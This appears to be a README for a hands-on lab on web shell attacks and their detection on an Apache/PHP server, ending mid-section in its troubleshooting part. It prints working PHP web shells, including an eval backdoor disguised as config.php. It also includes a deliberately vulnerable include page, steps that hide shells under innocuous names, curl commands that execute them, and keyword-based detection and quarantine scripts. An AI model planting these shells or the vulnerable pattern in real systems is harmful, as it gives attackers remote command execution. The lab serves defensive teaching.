# 🛡️ Web Shell Persistence and Detection  
### 🔥 Advanced Web Security & Incident Response Lab (Al Nafi Cloud)

![CyberSecurity](https://img.shields.io/badge/CyberSecurity-WebShell-red)
![Linux](https://img.shields.io/badge/Linux-Ubuntu-orange)
![Apache](https://img.shields.io/badge/WebServer-Apache-blue)
![PHP](https://img.shields.io/badge/PHP-7.4%2B-purple)
![Lab Status](https://img.shields.io/badge/Lab-Completed-success)

---

## 📌 Overview
This lab focuses on **web shell attacks, persistence mechanisms, detection techniques, and remediation strategies** in a controlled Linux web server environment.

Students will learn how attackers deploy web shells and how defenders detect, analyze, and remove them using **file system analysis, log monitoring, and automation scripts**.

---

## 🎯 Objectives
*   **Understand** web shell concepts and persistence techniques  
*   **Deploy and analyze** different types of web shells  
*   **Create** file-based detection scripts  
*   **Analyze** Apache logs for malicious behavior  
*   **Build** automated quarantine and removal tools  
*   **Implement** real-time monitoring systems  

---

## 🧠 Prerequisites
*   Linux command line basics  
*   Understanding of Apache/Nginx web servers  
*   Basic PHP knowledge  
*   Bash scripting fundamentals  

---

## ☁️ Lab Environment (Al Nafi Cloud)
*   🖥️ Ubuntu Linux machine  
*   🌐 Apache Web Server  
*   🐘 PHP 7.4+ enabled  
*   📊 Log tools: grep, awk, sed  
*   📝 Editors: nano, vim  
*   📁 Pre-configured web directories  

---

# 🧪 Task 1: Web Environment Setup

### ⚙️ Step 1.1: Start Apache & Setup Directory
Initialize the server application environment and configure structural permissions for development:
```bash
sudo systemctl start apache2
sudo systemctl status apache2

sudo mkdir -p /var/www/html/testapp
sudo chown -R www-data:www-data /var/www/html/testapp
sudo chmod 755 /var/www/html/testapp
```

### ⚙️ Step 1.2: Vulnerable PHP App
Create the target landing routing template. Save this code block locally as `/var/www/html/testapp/index.php`:
```php
<?php
echo "<h1>Test Application</h1>";

echo "<form method='GET'>
        <input type='text' name='page'>
        <input type='submit'>
      </form>";

if(isset($_GET['page'])) {
    $page = $_GET['page'];
    if(file_exists($page . ".php")) {
        include($page . ".php");
    }
}
?>
```

### 📄 Step 1.3: Legitimate Pages
Populate standard environment mock data pages to simulate clean applications.

Save this script layer as `/var/www/html/testapp/about.php`:
```php
<?php
echo "<h2>About Us</h2>";
echo "<p>Legitimate content page.</p>";
?>
```

Save this script layer as `/var/www/html/testapp/contact.php`:
```php
<?php
echo "<h2>Contact</h2>";
echo "<p>Email: contact@example.com</p>";
?>
```

---

# 💣 Task 2: Web Shell Creation

Deploy variations of remote execution vectors to map diverse defensive analysis points.

### ⚡ Basic Web Shell
Save this script asset configuration locally as `/var/www/html/testapp/shell_basic.php`:
```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

### 🔐 Advanced Web Shell (Auth-based)
Save this script asset configuration locally as `/var/www/html/testapp/shell_advanced.php`:
```php
<?php
session_start();
$password = "test123";

if(!isset($_SESSION['auth']) && $_POST['pass'] != $password) {
    echo '<form method="POST">
            Password: <input type="password" name="pass">
            <input type="submit">
          </form>';
    exit;
}
$_SESSION['auth'] = true;

if(isset($_POST['cmd'])) {
    echo "<pre>";
    system($_POST['cmd']);
    echo "</pre>";
}
?>
```

### 🕶️ Stealth Web Shell (Hidden Eval)
Save this mock config backend handler file as `/var/www/html/testapp/config.php`:
```php
<?php
$db_host = "localhost";
$db_user = "admin";

if(isset($_COOKIE['debug']) && $_COOKIE['debug'] == 'true') {
    if(isset($_POST['x'])) {
        eval($_POST['x']);
    }
}
?>
```

### 📂 Deploy Shells
Set up directory infrastructure persistence spaces, mimicking hidden entry parameters used by adversaries:
```bash
sudo mkdir -p /var/www/html/testapp/uploads
sudo mkdir -p /var/www/html/testapp/.hidden

sudo cp /var/www/html/testapp/shell_basic.php /var/www/html/testapp/uploads/image.php
sudo cp /var/www/html/testapp/shell_advanced.php /var/www/html/testapp/.hidden/admin.php
```

---

# 🧪 Task 3: Testing & Traffic Generation

### ⚡ Execute Web Shells
Interact directly with the functional basic endpoint to test operating system calls:
```bash
curl "http://localhost/testapp/shell_basic.php?cmd=whoami"
curl "http://localhost/testapp/shell_basic.php?cmd=id"
curl "http://localhost/testapp/shell_basic.php?cmd=pwd"
```

### 📡 Generate Attack Logs
Execute a looping sequence to inject multiple entries into the target system logging pipelines:
```bash
for i in {1..5}; do
    curl -s "http://localhost/testapp/shell_basic.php?cmd=ls"
done
```

### 🧾 Stealth Activity
Test the evaluation configuration script by passing tracking header flags alongside hidden payloads:
```bash
curl -s -b "debug=true" -d "x=phpinfo();" \
http://localhost/testapp/config.php
```

---

# 🧪 Task 4: Web Shell Detection Scripts

### 🔍 `webshell_detector.sh`
This script scans static site parameters for specific matching dynamic code execution arrays. Save this code script asset into your workspace root directory:
```bash
#!/bin/bash

WEB_ROOT="/var/www/html"
SUSPICIOUS_FUNCTIONS=("system" "exec" "shell_exec" "passthru" "eval")

detect_webshells() {
    local directory=$1
    echo "Scanning: $directory"

    find "$directory" -name "*.php" | while read file; do
        echo "Checking: $file"
        grep -E "system|exec|eval" "$file" && echo "[ALERT] Suspicious code found"
    done
}

detect_webshells "$WEB_ROOT"
```

### 📊 `log_analyzer.sh`
This automation parses server activity tracks to locate malicious request queries. Save this script configuration directly inside your workspace:
```bash
#!/bin/bash

ACCESS_LOG="/var/log/apache2/access.log"

echo "=== Log Analysis ==="

grep -E "(cmd=|exec=|system=)" "$ACCESS_LOG"

echo "Total requests: $(wc -l < $ACCESS_LOG)"
```

### 📡 `realtime_monitor.sh`
This script provides live visibility into inbound web interface payload configurations. Save this configuration profile directly inside your workspace:
```bash
#!/bin/bash

ACCESS_LOG="/var/log/apache2/access.log"

tail -f "$ACCESS_LOG" | while read line; do
    if echo "$line" | grep -qE "(cmd=|exec=)"; then
        echo "[ALERT] Suspicious activity detected"
    fi
done
```

Apply operational execution permissions across all detection systems:
```bash
chmod +x webshell_detector.sh log_analyzer.sh realtime_monitor.sh
```

---

# 🧪 Task 5: Removal & Remediation

### 🧹 `webshell_remover.sh`
This script isolates matching files out of exposed system scopes into an air-gapped quarantine storage environment. Save this script inside your active folder workspace:
```bash
#!/bin/bash

WEB_ROOT="/var/www/html"
QUARANTINE="$HOME/webshell_quarantine"

mkdir -p "$QUARANTINE"

find "$WEB_ROOT" -name "*.php" | while read file; do
    if grep -qE "system|eval|exec" "$file"; then
        echo "Quarantining $file"
        mv "$file" "$QUARANTINE/"
    fi
done
```

### 🔒 `verify_cleanup.sh`
Verify deployment structures to confirm all indicators of compromise have been removed. Save this script inside your active folder workspace:
```bash
#!/bin/bash

echo "=== Cleanup Verification ==="
find /var/www/html -name "*.php"
echo "Scan complete"
```

Apply execution rights to your mitigation scripts:
```bash
chmod +x webshell_remover.sh verify_cleanup.sh
```

---

# 📊 Task 6: Monitoring Dashboard

### 📈 `webshell_dashboard.sh`
This dashboard tracks environment stats and operational variables. Save this module code script directly inside your active repository configuration workspace:
```bash
#!/bin/bash

clear

echo "=================================="
echo "   Web Shell Security Dashboard"
echo "=================================="

echo "Date: $(date)"
echo "Active PHP files: $(find /var/www/html -name '*.php' | wc -l)"
echo "Log entries: $(wc -l < /var/log/apache2/access.log)"

echo "=================================="
```

Make your dashboard executable:
```bash
chmod +x webshell_dashboard.sh
```

---

## 📊 Expected Outcomes
*   ✔ Advanced comprehension of web shell persistence mechanics
*   ✔ Successful local discovery of obfuscated PHP backdoors
*   ✔ Critical parsing analysis workflows over raw Apache transaction logs
*   ✔ Automated programmatic deployment of detection tooling structures
*   ✔ Implementation of proactive, quarantine-based remediation rules

---

## ⚠️ Troubleshooting

### Apache Issues
*   Restart web daemon properties: `sudo systemctl restart apache2`
*   Verify your local network interfaces listen accurately: `sudo netstat -tlnp | grep :80`

### Permission Fix
If files deployed inside test environments block server execution routines:
```bash
